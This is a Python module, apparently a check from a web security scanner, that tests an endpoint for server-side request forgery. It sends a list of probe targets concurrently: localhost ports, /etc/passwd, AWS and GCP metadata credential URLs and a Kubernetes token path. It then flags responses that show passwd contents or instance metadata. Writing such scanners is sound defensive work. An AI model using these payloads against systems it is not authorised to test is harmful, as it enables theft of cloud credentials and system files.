import requests
from ..models import CheckResult

def check(base_url, scenario, logger):
    url = f"{base_url}{scenario.target}"
    # Target param expects a URL
    param = scenario.config.get("param", "url")
    
    # Internal targets to probe (Real-world Cloud Metadata & Sensitive Files)
    internal_targets = [
        "http://127.0.0.1",
        "http://localhost:8080",
        "http://0.0.0.0:22",
        "file:///etc/passwd", 
        "file:///c:/boot.ini", # Windows
        
        # AWS Metadata (Instance Identity)
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://169.254.169.254/latest/user-data",
        
        # GCP Metadata
        "http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token",
        
        # Kubernetes Service Account
        "/var/run/secrets/kubernetes.io/serviceaccount/token"
    ]
    
    import concurrent.futures
    
    def check_target(target):
        try:
            data = {param: target}
            res = requests.post(url, json=data, timeout=3)
            logger.log_request("POST", url, None, data, res)
            
            if res.status_code == 200:
                if "root:x:0:0" in res.text:
                     return CheckResult(scenario.id, scenario.type, "VULNERABLE", "HIGH", "SSRF/LFI Execution confirmed (read /etc/passwd).")
                if "ami-id" in res.text or "instance-id" in res.text:
                     return CheckResult(scenario.id, scenario.type, "VULNERABLE", "CRITICAL", "Cloud Metadata accessed via SSRF.")
                if len(res.text) > 50:
                    return CheckResult(scenario.id, scenario.type, "VULNERABLE", "HIGH", f"Server fetched internal resource: {target}")
        except:
             pass
        return None

    # Parallel SSRF Probes
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        futures = [executor.submit(check_target, t) for t in internal_targets]
        for f in concurrent.futures.as_completed(futures):
            res = f.result()
            if res:
                return res
            
    return CheckResult(scenario.id, scenario.type, "SECURE", None, "No SSRF execution confirmed.")
